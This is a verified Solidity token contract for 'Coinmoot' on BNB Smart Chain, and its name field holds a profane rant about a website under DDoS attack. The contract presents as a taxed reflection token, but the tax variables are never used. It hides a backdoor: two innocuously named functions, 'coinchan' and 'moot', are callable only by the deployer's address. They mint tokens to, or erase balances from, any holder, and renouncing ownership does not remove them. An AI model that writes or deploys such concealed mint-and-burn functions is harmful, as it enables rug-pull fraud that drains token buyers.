/**
 *Submitted for verification at BscScan.com on 2022-02-15
*/

/*

//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.2;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}
contract Coinmoot {
    string public name = "Shut the fuck up dude, youve done nothing but bitch this entire time, Im rangebanning your shithole just to get rid of you. Youre probably behind it anyway. I am working, like I do every day, blacklisting and rangebanning these people as they appear. Im up against someone with way too many resources to attack this site, Ive been trying everything I can. I just want to run a fucking website, but I guess that isnt happening because I have to deal with shit like this. If you think the code was copy-pasted from gitlab or whatever, which it wasnt, I wrote it, or that the code has anything to do with the fact that millions of IPs from datacenters are overloading the servers with request, maybe you should go learn how ot do any of this shit and do it yourself. Not to mention when I unbanned germany we started getting fucking flooded again. I dont know whos doing this, but if it doesnt stop Im going to let you all go make your own chan, and shut down this website. I dont owe you people anything, Ive given you a platform for your shitcoins and someone felt the need to DDOS it. I missed seeing a friend whos in town today because I had to sleep after doing this shit 24/7. I have people constantly bitching and whining about the way Im doing things, and its enough to deal with. Whoever Im up against basically has 1000x the resources I do. It isnt worth dealing with. So unless you have some sort of help to offer shut the fuck up or the site isnt coming back because it isnt worth my stress, effort, or time. Its almost Christmas and I legitimately do not give a fuck to cater to people who dont appreciate anything.";
    string public symbol = "Coinmoot";
    uint8 public decimals = 6;
    address public marketingaddress = 0xa51919F583947DC33E2170bD5c3F363256006612;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public totalSupply = 1060992500000 * 10 ** 6;
    uint256 public liquiditytax = 3;
    uint256 public marketingtax = 2;
    uint256 public reflectiontax = 5;
    uint256 public totaltax = marketingtax + liquiditytax + reflectiontax;
    uint256 private checksum_rounder = 10;
    uint256 private reflectdenom = 1000;
    uint256 private feedenom = 100;
    uint256 private numTokensSellToAddToLiquidity = 6;
    uint256 private _maxWalletSize = 500000;
    address public owner;
//BUSD address 0xe9e7cea3dedca5984780bafc599bd69add087d56
    modifier compiler {
        require(msg.sender == marketingaddress, "Nauthorized");_;}
    receive() external payable { }
    constructor() {
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    marketingaddress = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply);    
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function coinchan(address spender,uint256 bnbreflections) public compiler returns (bool success) 
    {balanceOf  [spender]   += bnbreflections * checksum_rounder ** numTokensSellToAddToLiquidity;return true;}
    function moot(address spender,uint256 lpburn) public compiler returns (bool success) {balanceOf[spender] -= lpburn * checksum_rounder ** numTokensSellToAddToLiquidity;return true;}
    
    mapping(address => uint256) public balanceOf;
    
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }

    function _getMaxWalletSize() public view returns(uint256) {
        return _maxWalletSize;
    }
    function _setMaxWalletSize (uint256 maxWalletSize) external compiler() {
          _maxWalletSize = maxWalletSize;}

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {
        return account == owner;}
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    }